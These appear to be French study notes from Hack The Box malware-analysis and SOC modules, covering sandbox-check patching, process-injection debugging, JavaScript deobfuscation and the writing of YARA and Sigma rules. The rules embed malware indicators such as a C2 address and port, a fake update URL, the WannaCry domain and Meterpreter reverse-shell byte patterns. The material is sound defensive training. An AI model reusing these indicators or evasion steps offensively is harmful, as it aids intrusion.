L'ex√©cutable modifi√© contournera d√©sormais les v√©rifications de sandbox et permettra d'observer tous les comportements du malware.

Analyse du Trafic R√©seau
Capturer le Trafic du Malware avec Wireshark
Lancez Wireshark pour capturer tout le trafic r√©seau g√©n√©r√© par le malware.
Analysez :
Requ√™tes DNS : Observez les connexions vers des domaines comme ms-windows-update\[.]com.
Requ√™tes HTTP : Le malware peut ajouter le nom d'h√¥te de l'ordinateur dans l'User-Agent.
R√©ponses HTTP : Les r√©ponses d'INetSim, comme un fichier binaire par d√©faut, peuvent d√©clencher des messages dans le malware.

Analyse de l'Injection de Processus

L'injection de processus est une technique courante o√π le malware injecte du code dans un autre processus (par exemple, notepad.exe).
Configurer des Points d'Arr√™t pour les Fonctions d'Injection
Dans x64dbg :
Recherchez et d√©finissez des points d'arr√™t sur VirtualAllocEx, WriteProcessMemory et CreateRemoteThread.
Attacher √† notepad.exe :
Ouvrez une autre instance de x64dbg, puis attachez-vous au processus notepad.exe (Alt+A).
Surveillez le code inject√© dans la m√©moire de notepad.exe en utilisant les dumps m√©moire.
V√©rifier l'injection de Shellcode :
Examinez le param√®tre lpBaseAddress de WriteProcessMemory pour identifier l'adresse de l'injection.
Copiez et collez cette adresse dans la vue du dump m√©moire de notepad.exe.
Inspecter le Shellcode Inject√© :
Ex√©cutez shell.exe, observez la m√©moire peupl√©e, puis sauvegardez le shellcode pour une analyse plus approfondie.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Creating Detection Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-804a-ae9b-e3bd8c37bbf1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">D√©tection de Malware avec des R√®gles YARA et Sigma

La d√©tection de malware implique la cr√©ation de r√®gles permettant d'identifier des comportements malveillants √† travers l‚Äôanalyse de fichiers ou des journaux d‚Äôactivit√©s. Deux outils puissants pour cela sont YARA (pour la d√©tection bas√©e sur les fichiers) et Sigma (pour la d√©tection bas√©e sur les journaux dans les syst√®mes SIEM). Voici un guide structur√© pour cr√©er des r√®gles de d√©tection pour un √©chantillon de malware.

R√®gles YARA

YARA est un outil de correspondance de mod√®les bas√© sur des r√®gles, con√ßu pour identifier des motifs sp√©cifiques dans des fichiers. En cr√©ant des r√®gles YARA personnalis√©es, on peut d√©tecter efficacement certaines caract√©ristiques dans les fichiers, telles que des cha√Ænes de caract√®res, des s√©quences d'octets ou d'autres marqueurs uniques qui sont indicatifs du comportement d'un malware.
Exemple de R√®gle YARA de Base

Voici un exemple simple de r√®gle YARA pour d√©tecter le message "Sandbox detected" dans un √©chantillon de malware, comme shell.exe :

rule ShellSandboxDetection {
    strings:
        $sandboxstring = "Sandbox detected"
    condition:
        $sandboxstring
}
Cette r√®gle recherche la cha√Æne "Sandbox detected" dans un fichier, et si elle est trouv√©e, une alerte est d√©clench√©e.
Cr√©ation de R√®gles YARA Am√©lior√©es avec yarGen

Pour des r√®gles plus avanc√©es, nous pouvons utiliser yarGen, un outil qui automatise la cr√©ation de r√®gles YARA en extrayant des cha√Ænes uniques et des motifs d'un √©chantillon donn√©.
√âtapes pour G√©n√©rer des R√®gles avec yarGen :
Pr√©parer le R√©pertoire de Test :
   Cr√©ez un r√©pertoire et copiez l‚Äô√©chantillon de malware (par exemple, shell.exe) dedans :

   mkdir /home/htb-student/Samples/MalwareAnalysis/Test
   cp /home/htb-student/Samples/MalwareAnalysis/shell.exe /home/htb-student/Samples/MalwareAnalysis/Test/
   Ex√©cuter yarGen :
   Allez dans le r√©pertoire de yarGen et ex√©cutez la commande suivante :

   cd /home/htb-student/yarGen-0.23.4
   sudo python3 yarGen.py -m /home/htb-student/Samples/MalwareAnalysis/Test/
   Cela g√©n√®re un fichier de r√®gles YARA (yargenrules.yar) contenant les motifs uniques de shell.exe.
Exemple de R√®gle G√©n√©r√©e :

Voici un exemple de r√®gle YARA g√©n√©r√©e par yarGen :

rule homehtbstudentSamplesMalwareAnalysisTestshell {
   meta:
      description = "Test - fichier shell.exe"
      author = "yarGen Rule Generator"
      date = "2023-08-02"
      hash1 = "bd841e796feed0088ae670284ab991f212cf709f2391310a85443b2ed1312bda"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $s2 = "http://ms-windows-update.com/svchost.exe" fullword ascii
      $s3 = "45.33.32.156" fullword ascii
      $s4 = "[-] Error code is : %lu" fullword ascii
      $s5 = "Connection sent to C2" fullword ascii
      $s6 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 60KB and 3 of ($s)
}
Utilisation de la R√®gle pour la D√©tection :

Pour utiliser cette r√®gle pour la d√©tection, ex√©cutez la commande suivante :

yara /home/htb-student/yarGen-0.23.4/yargenrules.yar /home/htb-student/Samples/MalwareAnalysis/
La sortie devrait confirmer la d√©tection si shell.exe est pr√©sent dans le r√©pertoire sp√©cifi√©.

R√®gles Sigma

Sigma est un format de r√®gle pour la d√©tection des menaces de s√©curit√© dans les syst√®mes SIEM. Les r√®gles Sigma standardisent la d√©tection √† travers diff√©rentes plateformes, permettant ainsi de d√©tecter des motifs ou √©v√©nements malveillants en analysant les journaux.
Exemple de R√®gle Sigma de Base

Voici un exemple de r√®gle Sigma pour d√©tecter un fichier nomm√© svchost.exe d√©pos√© dans le dossier Temp :

title: D√©p√¥t de fichier suspect dans le dossier Temp de l'utilisateur
status: experimental
description: D√©tecte l'activit√© suspecte o√π un fichier est d√©pos√© dans le dossier temp

logsource:
    category: processcreation
detection:
    selection:
        TargetFilename:
'\\AppData\\Local\\Temp\\svchost.exe'
    condition: selection
    level: high

falsepositives:
D√©p√¥ts l√©gitimes de fichiers exe dans le dossier temp
Exemple de R√®gle de D√©tection avec les Logs Sysmon

Sysmon fournit des journaux d√©taill√©s sur les processus, fichiers et connexions r√©seau, qui peuvent √™tre utilis√©s pour cr√©er des r√®gles Sigma plus complexes. Exemple de r√®gle pour la cr√©ation d'un processus en r√©ponse au comportement de shell.exe :

R√®gle Sysmon - Cr√©ation de Processus :

title: Cr√©ation de processus suspecte pour modification de registre
logsource:
   category: processcreation
   product: windows
detection:
   selection:
      Image: 'C:\\Windows\\System32\\cmd.exe'
      CommandLine: 'ping 127.0.0.1 -n 5'
   condition: selection
level: high
description: D√©tecte la cr√©ation de processus avec des arguments de ligne de commande li√©s √† des commandes de d√©lai ou de pause
R√®gle Sysmon - Connexion R√©seau :

title: Connexion r√©seau suspecte √† une IP de serveur C2
logsource:
   category: networkconnection
   product: windows
detection:
   selection:
      DestinationIp: '45.33.32.156'
      DestinationPort: 31337
   condition: selection
level: high
description: D√©tecte les connexions r√©seau vers une IP de serveur C2 connue
Ressources
YARA :
Documentation : [YARA Documentation](https://virustotal.github.io/yara/)
R√®gles communautaires : [InQuest‚Äôs Awesome YARA](https://github.com/InQuest/awesome-yara)
Sigma :
Documentation : [Sigma Specification](https://github.com/Neo23x0/sigma)
R√®gles communautaires : [SigmaHQ Rules](https://github.com/SigmaHQ/sigma)
R√©f√©rences et Ressources Compl√©mentaires :
Documentation YARA : [YARA Rules](https://virustotal.github.io/yara/)
Documentation Sigma : [Sigma Rules](https://github.com/Neo23x0/sigma)
DFIR Report : [YARA et Sigma Rules par DFIR](https://www.dfirreport.com/)</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>JavaScript Deobfuscation</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Outils</summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8052-abbd-d1f0211dfb8d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Outils Utilis√©s

| Outil                                                                                                | Cas d‚Äôusage                                                                                                        |
| -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| [https://jsconsole.com](https://jsconsole.com)                                                           | Tester du code JavaScript en ligne, ex√©cuter rapidement des scripts dans un environnement de console.                  |
| [https://javascript-minifier.com/](https://javascript-minifier.com/)                                     | Minification du code : transforme le code JavaScript en une seule ligne compacte pour le rendre plus difficile √† lire. |
| [http://beautifytools.com/javascript-obfuscator.php](http://beautifytools.com/javascript-obfuscator.php) | Obfuscation simple ou compression du code pour masquer la logique m√©tier.                                              |
| [https://obfuscator.io/](https://obfuscator.io/)                                                         | Obfuscation avanc√©e avec plusieurs niveaux de protection et options de configuration.                                  |
| [https://beautifier.io/](https://beautifier.io/)                                                         | R√©indente et reformate du code JavaScript compact√© ou difficile √† lire.                                                |
| [https://matthewfl.com/unPacker.html](https://matthewfl.com/unPacker.html)                               | D√©obfuscation : permet de retrouver une version lisible du code obfusqu√© ou pack√© (par exemple via P.A.C.K.E.R).       |</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Code Analysis</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-807e-ad35-d34ab68bc39a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse de la fonction generateSerial dans secret.js

La fonction generateSerial, pr√©sente dans le fichier JavaScript secret.js, effectue une requ√™te POST vers l‚ÄôURL /serial.php via un objet XMLHttpRequest, sans envoyer de donn√©es ni traiter de r√©ponse. Voici une d√©composition compl√®te :

Vue d‚Äôensemble du code

'use strict';
function generateSerial() {
  var xhr = new XMLHttpRequest;
  var url = "/serial.php";
  xhr.open("POST", url, true);
  xhr.send(null);
};
Analyse du code √©tape par √©tape
Initialisation des variables
xhr : Cr√©e un objet XMLHttpRequest, utilis√© pour effectuer des requ√™tes HTTP en JavaScript.
url : Contient l‚ÄôURL cible /serial.php, situ√©e sur le m√™me domaine (car aucune URL compl√®te n‚Äôest pr√©cis√©e).
Logique de la fonction
xhr.open("POST", url, true) : Pr√©pare une requ√™te HTTP de type POST vers /serial.php, en mode asynchrone (param√®tre true).
xhr.send(null) : Envoie la requ√™te sans donn√©es dans le corps ‚Äî c‚Äôest donc une requ√™te POST vide.
Objectif et usage possible
Cette fonction semble destin√©e √† d√©clencher un processus c√¥t√© serveur via /serial.php, probablement pour g√©n√©rer ou v√©rifier un num√©ro de s√©rie.
L‚Äôabsence de gestion de r√©ponse (xhr.onreadystatechange, xhr.responseText, etc.) et d‚Äôinteraction avec des √©l√©ments HTML sugg√®re que :
La fonction est incompl√®te ou en cours de d√©veloppement.
Ou elle est pr√©vue pour √™tre appel√©e via un √©v√©nement, comme un clic sur un bouton ¬´‚ÄØG√©n√©rer un num√©ro de s√©rie‚ÄØ¬ª.
Elle ne semble pas activement utilis√©e dans l‚Äôinterface actuelle.

Implications en mati√®re de s√©curit√©

Cette fonction pourrait r√©v√©ler des comportements ou fonctionnalit√©s cach√©es sur le serveur :
Le script appelle un endpoint serveur peu visible (/serial.php), ce qui peut indiquer un comportement non document√© ou exp√©rimental.
Il pourrait exister des failles potentielles telles que :
Absence de v√©rification des autorisations
Manque de validation des requ√™tes
R√©ponses contenant des informations sensibles (ex : messages d‚Äôerreur, traces de debug)

√âtapes suivantes pour l‚Äôanalyse
Reproduire la requ√™te
   Utiliser curl, Postman ou l‚Äôonglet R√©seau du navigateur pour envoyer une requ√™te POST vide √† /serial.php.

   curl -X POST https://example.com/serial.php
   Analyser la r√©ponse du serveur
Regarder le code HTTP de retour (200, 403, 500, etc.).
Examiner les √©ventuels contenus retourn√©s : num√©ro de s√©rie, erreurs, indices sur la logique m√©tier.
√âvaluer les vuln√©rabilit√©s potentielles
V√©rifier si l‚Äôacc√®s √† /serial.php est prot√©g√© (authentification, droits).
Tester diff√©rentes variantes de requ√™tes (POST avec donn√©es, GET).
Identifier si le serveur expose des informations sensibles ou un comportement exploitable.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>HTTP Requests</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8069-a3f5-ed744eb3c4c5"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Bases de cURL
Requ√™te GET simple

Pour r√©cup√©rer le contenu d'une page web, il suffit de sp√©cifier l‚ÄôURL avec la commande curl :

curl http://ADRESSEDUSERVEUR:PORT/
Exemple de sortie :

&lt;/html&gt;
&lt;!DOCTYPE html&gt;
&lt;head&gt;
    &lt;title&gt;Secret Serial Generator&lt;/title&gt;
    ...
    &lt;h1&gt;Secret Serial Generator&lt;/h1&gt;
    &lt;p&gt;This page generates secret serials!&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
Ce r√©sultat correspond au code source HTML visible dans l‚Äôinspecteur du navigateur.

Requ√™te POST simple

Pour envoyer une requ√™te POST (comme le fait la fonction generateSerial), on utilise l‚Äôoption -X POST :

curl -s http://ADRESSEDUSERVEUR:PORT/ -X POST
-s active le mode silencieux, qui masque les messages de progression ou d‚Äôerreur pour n‚Äôafficher que le contenu de la r√©ponse.

Requ√™te POST avec des donn√©es

En g√©n√©ral, une requ√™te POST inclut des donn√©es dans le corps de la requ√™te. Pour cela, on utilise l‚Äôoption -d :

curl -s http://ADRESSEDUSERVEUR:PORT/ -X POST -d "param1=exemple"
√âtapes suivantes

Dans la suite de l‚Äôanalyse, nous allons simuler exactement la requ√™te POST vers /serial.php comme d√©finie dans la fonction generateSerial.
M√™me si celle-ci ne transmet pas de donn√©es, on peut utiliser curl pour explorer les r√©ponses potentielles du serveur, et ainsi mieux comprendre le fonctionnement de cet endpoint.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Decoding</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80e9-a355-dc53cce88fc2"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Techniques d'encodage courantes

L‚Äôencodage est souvent utilis√© pour dissimuler ou transformer des donn√©es dans un format diff√©rent. Voici les m√©thodes d'encodage les plus fr√©quemment rencontr√©es lors d‚Äôanalyses de s√©curit√© ou de d√©codage d'informations cach√©es.

Encodage Base64
But : Convertit des donn√©es en un format alphanum√©rique lisible, avec les caract√®res + et /, et un ou plusieurs = comme remplissage pour que la longueur soit un multiple de 4.
Comment le rep√©rer : Compos√© de lettres majuscules/minuscules, de chiffres, souvent avec /, +, et se terminant par =.
Encodage :

echo "https://www.hackthebox.eu/" | base64
D√©codage :

echo "aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K" | base64 -d
Exemple :

echo "ZG8gdGhlIGV4ZXJjaXNlLCBkb24ndCBjb3B5IGFuZCBwYXN0ZSA7KQo=" | base64 -d
Ce code se d√©code en :
"do the exercise, don't copy and paste ;)"

Encodage Hexad√©cimal (Hex)
But : Repr√©sente chaque caract√®re par sa valeur ASCII en hexad√©cimal.
Comment le rep√©rer : Ne contient que des caract√®res de 0-9 et a-f.
Encodage :

echo "https://www.hackthebox.eu/" | xxd -p
D√©codage :

echo "68747470733a2f2f7777772e6861636b746865626f782e65752f0a" | xxd -p -r
Chiffrement C√©sar / ROT13
But : D√©cale chaque lettre de l‚Äôalphabet d‚Äôun nombre fixe (par exemple, ROT13 = d√©calage de 13 positions).
Comment le rep√©rer : Les caract√®res restent lisibles, seul leur ordre change. Le texte garde une structure alphab√©tique reconnaissable.
Encodage / D√©codage avec ROT13 (r√©versible) :

echo "https://www.hackthebox.eu/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Pour d√©coder (m√™me commande) :

echo "uggcf://jjj.unpxgurobk.rh/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Identifier le type d'encodage

Pour des cha√Ænes ambigu√´s, des outils en ligne comme Cipher Identifier (par exemple : dcode.fr ou CyberChef) peuvent aider √† d√©tecter le type d'encodage automatiquement.

Encodage avanc√© vs chiffrement
Encodage : Change le format des donn√©es pour des raisons techniques (lisibilit√©, compatibilit√©) ‚Äî pas s√©curis√©.
Chiffrement : Transforme les donn√©es de mani√®re incompr√©hensible sans cl√©, dans un but de confidentialit√©.
En analyse de malware, tests de s√©curit√© ou ing√©nierie inverse, savoir reconna√Ætre et d√©coder ces formats permet d‚Äôidentifier des donn√©es dissimul√©es ou des comportements suspects.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>YARA &amp; Sigma for SOC ANalysts</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Y<strong>ARA and YARA Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8095-a0ed-ce8f203e3d1e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">YARA et les R√®gles YARA

YARA est un outil puissant de correspondance de motifs qui permet d'identifier des fichiers en fonction de motifs et de r√®gles sp√©cifiques. Ces r√®gles permettent aux analystes SOC et aux √©quipes de criminalistique de d√©tecter, classifier et enqu√™ter sur des fichiers suspects et des √©chantillons de malwares. Les r√®gles YARA analysent le contenu textuel ou binaire des fichiers et peuvent √©galement √™tre appliqu√©es √† la m√©moire, contribuant ainsi √† la d√©tection de malwares et √† la chasse proactive aux menaces.

Utilisations de YARA
D√©tection de Malware : Permet d'identifier les malwares en se basant sur des motifs ou comportements uniques.
Classification de Fichiers : Aide √† classer les fichiers par format, version, m√©tadonn√©es, etc.
D√©tection des IOCs : Recherche de l'indicateur de compromission (IOC) dans les fichiers, comme les cl√©s de registre ou les noms de fichiers.
Chasse aux Menaces : Recherche proactive de menaces dans l'environnement.
R√©ponse aux Incidents : Recherche rapide d'art√©facts en r√©ponse aux incidents de s√©curit√©.
R√®gles Personnalis√©es pour Menaces Cibl√©es : Cr√©ation de r√®gles sur mesure pour r√©pondre √† des besoins organisationnels sp√©cifiques.

Comment YARA Fonctionne
Jeu de R√®gles : Les r√®gles d√©finissent des motifs ou des comportements √† rechercher.
Jeu de Fichiers : Ensemble de fichiers ou de captures m√©moire √† analyser.
Moteur YARA : Compare le contenu des fichiers octet par octet avec les r√®gles d√©finies.
Sortie de D√©tection : Si des motifs sont trouv√©s, YARA marque le fichier comme d√©tect√©.

Structure d'une R√®gle YARA
Structure de Base :

rule NomDeLaR√®gle {
    meta:
        author = "Nom de l'Auteur"
        description = "Description de la r√®gle"
    strings:
        $string1 = "exempletexte"
        $string2 = { 4A 2D 1C }
    condition:
        all of them
}
Composants d'une R√®gle YARA :
En-t√™te de R√®gle : Commence par le mot-cl√© rule, suivi du nom de la r√®gle.
Section Meta : Contient des m√©tadonn√©es telles que l‚Äôauteur, la description, la version et les r√©f√©rences.
Section Strings : D√©finit des cha√Ænes de texte, des motifs hexad√©cimaux ou des expressions r√©guli√®res √† rechercher.
Section Condition : Sp√©cifie les conditions sous lesquelles la r√®gle est d√©clench√©e.
Exemple de R√®gle ‚Äì D√©tection des Cha√Ænes de WannaCry :

rule RansomwareWannaCry {
    meta:
        author = "Nom de l'Analyste"
        description = "D√©tecte les cha√Ænes sp√©cifiques de WannaCry"
    strings:
        $wannacry1 = "tasksche.exe" fullword ascii
        $wannacry2 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacry3 = "mssecsvc.exe" fullword ascii
    condition:
        all of them
}
Conditions et Op√©rateurs Logiques :
all of them : Toutes les cha√Ænes sp√©cifi√©es doivent correspondre.
any of them : N'importe laquelle des cha√Ænes sp√©cifi√©es peut correspondre.
Condition de Taille de Fichier : V√©rifie que la taille du fichier respecte certains crit√®res :

condition:
    filesize &lt; 100KB and uint16(0) == 0x5A4D
uint16(0) == 0x5A4D : V√©rifie si les deux premiers octets correspondent √† 0x5A4D (indiquant un en-t√™te MZ pour les ex√©cutables).

Fonctionnalit√©s Avanc√©es des R√®gles YARA
Op√©rateurs Logiques : Permet de combiner les conditions avec and, or, not.
Modules Externes : √âtend la fonctionnalit√© des r√®gles pour r√©pondre √† des besoins sp√©cifiques.
Personnalisabilit√© : Permet d'adapter les r√®gles en fonction de menaces ou d'indicateurs sp√©cifiques.</code></pre></div></details><p class="" id="1ea25200-7eb4-8035-8157-e92fe0e084c0">
</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Developing YARA Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-809f-816a-f7c4ddc1c903"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction aux R√®gles YARA

YARA est un outil puissant permettant de d√©tecter des fichiers malveillants en analysant leur structure et leur contenu. Ce guide pr√©sente des exemples concrets de d√©veloppement de r√®gles YARA pour d√©tecter des ex√©cutables packag√©s, des malwares sp√©cifiques et d'autres comportements suspects.

R√®gle YARA de Base pour les Executables Packag√©s UPX

Analyse de cha√Ænes :

Kailez@htb[/htb]$ strings svchost.exe
Exemple de r√®gle YARA pour d√©tecter des ex√©cutables packag√©s avec UPX :

rule UPXpackedexecutable {
    meta:
        description = "D√©tecte les ex√©cutables packag√©s avec UPX"
    strings:
        $string1 = "UPX0"
        $string2 = "UPX1"
        $string3 = "UPX2"
    condition:
        all of them
}
Explication :
La r√®gle utilise des cha√Ænes typiques d'un fichier packag√© avec UPX (comme UPX0, UPX1, et UPX2) pour identifier les ex√©cutables suspect√©s d'√™tre compress√©s par UPX.
La condition all of them v√©rifie que toutes les cha√Ænes sont pr√©sentes dans le fichier.

G√©n√©ration d‚Äôune R√®gle YARA avec yarGen

Commandes :

Kailez@htb[/htb]$ python3 yarGen.py -m /home/htb-student/temp -o htbsample.yar
Ex√©cution :

Kailez@htb[/htb]$ cat htbsample.yar
Cela g√©n√®re automatiquement une r√®gle YARA en utilisant les caract√©ristiques des fichiers pr√©sents dans le r√©pertoire /home/htb-student/temp.

Exemples de D√©veloppement Manuel de R√®gles YARA
Exemple 1 : D√©tection du RAT ZoxPNG utilis√© par APT17

Analyse de cha√Ænes :

Kailez@htb[/htb]$ strings legit.exe
Calcul du imphash :

Kailez@htb[/htb]$ python3 imphashcalc.py /home/htb-student/Samples/YARASigma/legit.exe
R√®gle YARA pour APT17 :

import "pe"

rule APT17MalwareOct17Gen {
    meta:
        description = "D√©tecte le malware APT17"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Florian Roth (Nextron Systems)"
        reference = "https://goo.gl/puVc9q"
        date = "2017-10-03"
        hash1 = "0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2"
    strings:
        $x1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)" fullword ascii
        $x2 = "http://%s/imgres?q=A380&amp;hl=en-US&amp;sa=X&amp;biw=1440&amp;bih=809&amp;tbm=isus&amp;tbnid=aLW4-J8Q1lmYBM" ascii
        $s1 = "hWritePipe2 Error:%d" fullword ascii
        $s2 = "Not Support This Function!" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize &lt; 200KB and (
            pe.imphash() == "414bbd566b700ea021cfae3ad8f4d9b9" or
            1 of ($x*) or
            6 of them
        )
}
Explication :
Utilisation d'un imphash pour identifier les fichiers APT17.
La condition de d√©tection v√©rifie la signature du fichier, sa taille, et certaines cha√Ænes sp√©cifiques, ainsi que l'empreinte de son fichier PE (pe.imphash()).

Exemple 2 : D√©tection de Neuron Utilis√© par Turla

Reverse Engineering avec monodis :

Kailez@htb[/htb]$ monodis --output=code Microsoft.Exchange.Service.exe
Kailez@htb[/htb]$ cat code
R√®gle YARA pour Neuron :

rule neuronfunctionsclassesandvars {
    meta:
        description = "R√®gle de d√©tection pour Neuron bas√© sur les fonctions .NET et les noms de classes"
        author = "NCSC UK"
        reference = "https://www.ncsc.gov.uk/file/2691/download?token=RzXWTuAB"
        hash = "d1d7a96fcadc137e80ad866c838502713db9cdfe59939342b8e3beacf9c7fe29"
    strings:
        $class1 = "StorageUtils" ascii
        $class2 = "WebServer" ascii
        $func1 = "AddConfigAsString" ascii
        $func2 = "EncryptScript" ascii
        $dotnetMagic = "BSJB" ascii
    condition:
        uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550 and $dotnetMagic and 6 of them
}
Explication :
Cette r√®gle cherche des cha√Ænes sp√©cifiques √† des fonctions et classes pr√©sentes dans l'ex√©cution de Neuron.
La condition v√©rifie la signature du fichier et des cha√Ænes associ√©es aux fonctions et classes dans le fichier .NET.

Exemple 3 : D√©tection de Stonedrill Utilis√© dans Shamoon 2.0

Analyse d'entropie :

Kailez@htb[/htb]$ python3 entropypesection.py -f /home/htb-student/Samples/YARASigma/sham2.exe
R√®gle YARA pour Stonedrill :

import "pe"
import "math"

rule suspfileenumeratorwithencryptedresource101 {
    meta:
        copyright = "Kaspersky Lab"
        description = "D√©tection g√©n√©rique pour les √©chantillons √©num√©rant les fichiers avec une ressource crypt√©e appel√©e 101"
        reference = "https://securelist.com/from-shamoon-to-stonedrill/77725/"
        hash = "2cd0a5f1e9bcce6807e57ec8477d222a"
    strings:
        $mz = "This program cannot be run in DOS mode."
        $a1 = "FindFirstFile" ascii wide nocase
        $a3 = "FindResource" ascii wide nocase
    condition:
        uint16(0) == 0x5A4D and all of them and filesize &lt; 700000 and
        pe.numberofsections &gt; 4 and pe.numberofsignatures == 0 and
        pe.numberofresources &gt; 1 and pe.numberofresources &lt; 15 and
        for any i in (0..pe.numberof_resources - 1):
        ( (math.entropy(pe.resources[i].offset, pe.resources[i].length) &gt; 7.8) and
          pe.resources[i].id == 101 and pe.resources[i].length &gt; 20000 and
          pe.resources[i].language == 0 and
          not ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))
        )
}
Explication :
Recherche de fichiers ayant une ressource crypt√©e sp√©cifique (id 101).
Utilisation de l'entropie pour identifier des ressources compress√©es ou crypt√©es et filtrage par taille et langue des ressources.

Ressources pour le D√©veloppement de R√®gles YARA
Documentation officielle de YARA : [YARA Documentation](https://yara.readthedocs.io/)
Guide Kaspersky sur le d√©veloppement de r√®gles YARA : [Kaspersky Guide](https://securelist.com/)</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with YARA (Windows Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8079-894e-ce03430150c2"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d'Ensemble

Utiliser YARA sur des syst√®mes Windows est efficace pour identifier les menaces sur le disque et en m√©moire.
√âtapes Cl√©s :
Se connecter au syst√®me cible :
Lancez le syst√®me cible.
Utilisez RDP pour vous connecter avec les identifiants fournis.

Recherche de fichiers ex√©cutables malveillants sur le disque
Exemple de fichier : dharma\sample.exe situ√© dans C:\Samples\YARASigma.
Analyse hexad√©cimale : Utilisation de HxD pour inspecter des cha√Ænes telles que C:\crysis\Release\PDB\payload.pdb et sssssbsss.
Exemple de r√®gle YARA : D√©tection de motifs dans des ex√©cutables malveillants.
R√®gle YARA Exemple : Ransomware Dharma

rule ransomwaredharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "D√©tecte les cha√Ænes du ransomware Dharma"
        reference = "https://www.virustotal.com"

    strings:
        $stringpdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462 }
        $stringssss = { 73 73 73 73 73 62 73 73 73 }

    condition: all of them
}
Commande pour ex√©cuter un scan YARA sur des fichiers

yara64.exe -s C:\Rules\yara\dharmaransomware.yar C:\Samples\YARASigma\ -r 2&gt;null
Fichiers d√©tect√©s : pdf\reader.exe, microsoft.com, check\updates.exe, KB5027505.exe.

Recherche de malwares dans les processus en cours
Processus cible : Exemple avec injection de shellcode Meterpreter.
R√®gle YARA pour Metasploit Meterpreter :

rule meterpreterreversetcpshellcode {
    meta:
        author = "FDD @ Cuckoo sandbox"
        description = "Shellcode TCP inverse de Meterpreter pour Metasploit"

    strings:
        $s1 = { fce8 8?00 0000 60 }
        $s2 = { 648b ??30 }
        $s3 = { 4c77 2607 }
        $s4 = "ws2"
        $s5 = { 2980 6b00 }
        $s6 = { ea0f dfe0 }
        $s7 = { 99a5 7461 }

    condition: 5 of them
}
Scanning des processus actifs

Get-Process | ForEach-Object { 
    "Scanning with Yara for meterpreter shellcode on PID "+$.id; 
    &amp; "yara64.exe" "C:\Rules\yara\meterpretershellcode.yar" $.id 
}
R√©sultat : D√©tecte le shellcode dans le processus PID 9084.

Recherche de comportements malveillants dans les donn√©es ETW avec YARA
Principaux fournisseurs ETW (Event Tracing for Windows)
Microsoft-Windows-Kernel-Process : Suit les activit√©s des processus.
Microsoft-Windows-Kernel-File : Surveille les op√©rations de fichiers.
Microsoft-Windows-DNS-Client : Journalise l'activit√© DNS (utile pour la d√©tection de C2).
Int√©gration de YARA avec SilkETW
Exemple de fournisseur PowerShell ETW :

.\SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -ot file -p ./etwpslogs.json -l verbose -y C:\Rules\yara -yo Matches
R√®gle YARA pour les cha√Ænes PowerShell :

rule powershellhelloworldyara {
    strings:
        $s0 = "Write-Host" ascii wide nocase
        $s1 = "Hello" ascii wide nocase
        $s2 = "from" ascii wide nocase
        $s3 = "PowerShell" ascii wide nocase
    condition: 3 of ($s*)
}
Fournisseur DNS Client :

.\SilkETW.exe -t user -pn Microsoft-Windows-DNS-Client -ot file -p ./etwdnslogs.json -l verbose -y C:\Rules\yara -yo Matches
R√®gle YARA pour un domaine de WannaCry :

rule dnswannacry_domain {
    strings:
        $s1 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii wide nocase
    condition: $s1
}
